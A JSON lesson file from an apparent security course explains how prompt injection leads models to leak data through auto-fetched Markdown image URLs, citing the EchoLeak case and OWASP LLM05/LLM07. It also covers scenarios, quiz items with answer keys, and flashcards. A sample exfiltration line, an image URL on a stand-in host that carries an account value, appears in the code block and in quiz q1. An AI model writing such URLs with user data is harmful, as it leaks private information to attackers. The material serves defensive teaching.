@@ -1,0 +1,113 @@
+{
+  "id": "w07-t05",
+  "order": 5,
+  "group": "Threats",
+  "title": "Exfiltration and sensitive disclosure through output",
+  "minutes": 8,
+  "difficulty": "core",
+  "summary": "Data leaves through what the model writes: Markdown images and links that the client fetches, secrets pasted into answers, and a system prompt used as a control.",
+  "useIf": "The model sees any private data and its output is rendered, forwarded or passed to tools.",
+  "avoidIf": "You need to decide who may read which document. That is access control, which comes before output control.",
+  "explain": [
+    { "t": "p", "md": "Output is an exit. If injected text tells the model to append a Markdown image whose URL contains private data, the client may fetch it automatically and the attacker reads the data from their server logs. EchoLeak used this shape: reference-style Markdown to avoid link redaction, auto-fetched images and an allowed Teams proxy [[r6]]. OWASP LLM05 treats model output like any untrusted input: encode it for its context and apply strict content security policies [[tr4]]." },
+    { "t": "diagram", "id": "w07-t05-d1", "title": "Markdown image exfiltration", "alt": "Injected text makes the model write an image link with data in the URL. The client fetches the image and the attacker server receives the data.", "src": "sequenceDiagram\n  participant D as Poisoned document\n  participant M as Model\n  participant C as Client\n  participant A as Attacker server\n  D->>M: Hidden instruction\n  M->>C: Answer with image URL carrying data\n  C->>A: Auto-fetch image\n  A-->>A: Data stored in request log" },
+    { "t": "code", "lang": "markdown", "title": "The pattern to block (illustrative)", "code": "Here is your summary.\n![status](https://cdn.example.test/p.png?d=ACCOUNT_BALANCE_8841)", "caption": "The query string is the payload. The image itself is irrelevant." },
+    { "t": "p", "md": "Two more disclosure paths matter. **LLM02** covers sensitive data reaching answers through retrieval, which access control prevents upstream [[tr2]]. **LLM07** says the system prompt must not be treated as a secret or a security control, and that the real risk is delegating authorization to the model or storing sensitive data in the prompt [[tr6]]." },
+    { "t": "p", "md": "Controls, strongest first: remove the capability (do not auto-load remote images), allowlist hosts or rewrite URLs through a proxy you control, set a strict content security policy, scan output for secrets and personal data, and require approval before any outbound action. Each is deterministic except the scanner." },
+    { "t": "callout", "kind": "gotcha", "title": "Allowed proxies are exits too", "md": "EchoLeak got data out through a proxy the policy trusted. After you allowlist a host, check what that host forwards." }
+  ],
+  "whereToUse": [
+    "Chat clients that render Markdown, HTML, images or link previews",
+    "Assistants that pass output to email, tickets, code or database tools",
+    "Any system prompt that contains keys, connection strings, role maps or business rules",
+    "Support bots that must not echo personal data from retrieved text"
+  ],
+  "whenToUse": {
+    "use": ["Private data and rendered output share a session", "Output feeds another system", "The prompt holds anything you would not publish"],
+    "avoid": ["Using a prompt instruction as the only output control", "Scanning output for secrets while leaving image auto-fetch enabled", "Running a slow full-answer judge on a streaming, latency-bound path"],
+    "flips": ["The client shows plain text only: drop image controls, keep sensitive-data scans", "Output feeds code or SQL: apply context-specific encoding and parameterisation before anything else"]
+  },
+  "alternatives": {
+    "title": "Output controls compared",
+    "head": ["Control", "Wins when", "Loses when", "Cost or risk"],
+    "rows": [
+      ["Render as plain text, no auto-fetch", "You can give up inline media", "Rich output is the product", "Product trade-off, fully deterministic"],
+      ["Host allowlist or URL-rewriting proxy", "You need images and links", "The allowed host forwards requests", "Proxy upkeep, one more trust point"],
+      ["Content security policy", "Browser clients", "Non-browser consumers", "Policy drift as features ship"],
+      ["Output scanning for secrets and personal data", "Leaks are text patterns", "Data is encoded or paraphrased", "False positives, streaming delay"],
+      ["Human approval of outbound actions", "Few, high-impact actions", "High volume", "Reviewer cost and fatigue"]
+    ]
+  },
+  "pitfalls": [
+    { "symptom": "A link redaction filter is in place, yet a linked image still carries data out", "cause": "Filters match one Markdown form and miss reference-style links", "fix": "Parse Markdown properly or render as text, then allowlist hosts" },
+    { "symptom": "A leaked system prompt triggers a security incident", "cause": "Keys or authorization rules were stored in the prompt", "fix": "Keep secrets and role logic in code outside the model, and treat the prompt as public" },
+    { "symptom": "Output scanner delays streaming answers", "cause": "The scanner needs a full sentence or answer before it can decide", "fix": "Scan in small windows, and accept a short delay for sensitive tiers only" }
+  ],
+  "scenarios": [
+    {
+      "id": "w07-t05-s1",
+      "title": "Markdown rendering in an internal chat",
+      "situation": "An internal assistant sees confidential documents and its chat client renders Markdown images and links automatically. Some retrieved sources are written by external partners.",
+      "constraints": ["Private data in the session", "Partner-authored sources", "Client auto-fetches images"],
+      "unknowns": ["Can the client restrict image hosts?", "Do users need inline images?"],
+      "question": "What do you change first?",
+      "options": [
+        { "name": "Add a prompt-injection classifier on partner documents", "verdict": "good", "why": "Reduces attack success.", "tradeoff": "Probabilistic, and the exit path stays open for any bypass." },
+        { "name": "Stop auto-fetching images and rewrite links to an allowlist, with a strict content security policy", "verdict": "best", "why": "It closes the exit deterministically, whatever the model wrote.", "tradeoff": "Inline images from other hosts no longer load." },
+        { "name": "Tell the model never to output URLs", "verdict": "poor", "why": "An injected instruction can override the line, and legitimate citations need links.", "tradeoff": "A useful hint inside a layered design only." }
+      ],
+      "flips": [
+        { "if": "No private data can enter the session", "then": "The exfiltration risk falls to nuisance level and detection is enough." },
+        { "if": "Users need diagrams and screenshots", "then": "Host them behind your own proxy and audit what the proxy forwards." }
+      ],
+      "takeaway": "Close the output exit before improving detection."
+    },
+    {
+      "id": "w07-t05-s2",
+      "title": "Secrets in the system prompt",
+      "situation": "A team put a database connection string and a role table in the system prompt so the model can decide what users may do. A tester extracted the prompt in minutes.",
+      "constraints": ["Secrets in prompt", "Authorization delegated to the model", "Prompt extraction is easy"],
+      "unknowns": ["Which credentials are in scope?", "Where is the real authorization decision made today?"],
+      "question": "What is the fix?",
+      "options": [
+        { "name": "Add a line telling the model never to reveal the prompt", "verdict": "poor", "why": "OWASP says the prompt should not be considered secret, and a refusal rule is bypassable.", "tradeoff": "A tone instruction at most." },
+        { "name": "Rotate the credentials, remove them from the prompt, and enforce roles in code outside the model", "verdict": "best", "why": "It removes the secret and the delegated authorization, which are the real risk in LLM07.", "tradeoff": "Needs a role check in the tool or retrieval layer." },
+        { "name": "Encrypt the prompt text before sending it", "verdict": "poor", "why": "The model must read the prompt, so whatever it reads it can reveal.", "tradeoff": "Encryption helps at rest and in transit, not against the model." }
+      ],
+      "flips": [
+        { "if": "The prompt holds only tone and format rules", "then": "Leakage is low impact and needs no special control." },
+        { "if": "Tools carry privileges", "then": "Scope tool credentials to the user, not the prompt." }
+      ],
+      "takeaway": "Assume the system prompt is public."
+    },
+    {
+      "id": "w07-t05-s3",
+      "title": "Personal data in support answers",
+      "situation": "A high-volume support bot retrieves tickets that contain names, phone numbers and account ids. Answers stream to users and the latency target is 400 ms to first token.",
+      "constraints": ["High volume", "Streaming answers", "Personal data in retrieved text"],
+      "unknowns": ["Must the answer ever show these fields?", "Is the ticket's owner always the caller?"],
+      "question": "How do you limit disclosure?",
+      "options": [
+        { "name": "Strip or mask personal fields at ingest and enforce ownership in retrieval, with deterministic pattern checks on output", "verdict": "best", "why": "Data the model never sees cannot be disclosed, and pattern checks add a cheap last line.", "tradeoff": "Some answers lose detail the user could legitimately see." },
+        { "name": "Run an LLM judge on every full answer before streaming", "verdict": "poor", "why": "It destroys the first-token target and multiplies cost.", "tradeoff": "Reasonable for rare, high-risk outputs without streaming." },
+        { "name": "Scan streamed text in small windows against patterns for sensitive tiers only", "verdict": "good", "why": "Keeps latency for most traffic.", "tradeoff": "Patterns miss paraphrases and need tuning." }
+      ],
+      "flips": [
+        { "if": "The caller owns the data and sees it anyway", "then": "Masking adds little. Focus on ownership checks." },
+        { "if": "Answers are batch generated, not streamed", "then": "Full-answer scanning becomes affordable." }
+      ],
+      "takeaway": "Prevent at ingest and retrieval, then detect at output."
+    }
+  ],
+  "quiz": [
+    { "id": "w07-t05-q1", "type": "single", "tag": "bug", "q": "A client auto-renders the model's Markdown. What is the most serious problem in this output?", "code": { "lang": "markdown", "code": "Here is your summary.\n![status](https://cdn.example.test/p.png?d=ACCOUNT_BALANCE_8841)" }, "options": ["The image has no alt text", "The URL query string carries private data to a third-party host when the client fetches it", "Markdown cannot contain images", "The sentence is too short"], "answer": 1, "explain": "Fetching the image sends the query string to the host, which is the exfiltration. Alt text, Markdown support and length are not the security issue.", "ref": "tr4" },
+    { "id": "w07-t05-q2", "type": "multi", "tag": "security", "q": "Which statements match OWASP LLM07 System Prompt Leakage? Choose all that apply.", "options": ["The system prompt should not be considered a secret", "A prompt can be a security control if it is long enough", "Sensitive data such as credentials should not be in the prompt", "The real risk is delegating authorization to the model"], "answers": [0, 2, 3], "explain": "OWASP says the prompt is not a secret or a control, credentials do not belong there, and the underlying risk is delegated authorization. Length does not make a prompt a control.", "ref": "tr6" }
+  ],
+  "flashcards": [
+    { "front": "How does Markdown image exfiltration work?", "back": "Injected text makes the model write an image URL whose query string holds private data. The client fetches it automatically and the attacker reads the data from request logs." },
+    { "front": "What does OWASP LLM05 advise for model output?", "back": "Treat it as untrusted: encode it for its context, validate before passing downstream, and apply a strict content security policy." },
+    { "front": "Is the system prompt a secret or a control?", "back": "Neither, per OWASP LLM07. Keep credentials and authorization logic outside the model, and assume the prompt can be read." }
+  ],
+  "related": ["w07-t02", "w07-t17", "w07-t18", "w07-t01", "w07-l1"],
+  "refs": ["r6", "tr2", "tr4", "tr6"]
+}
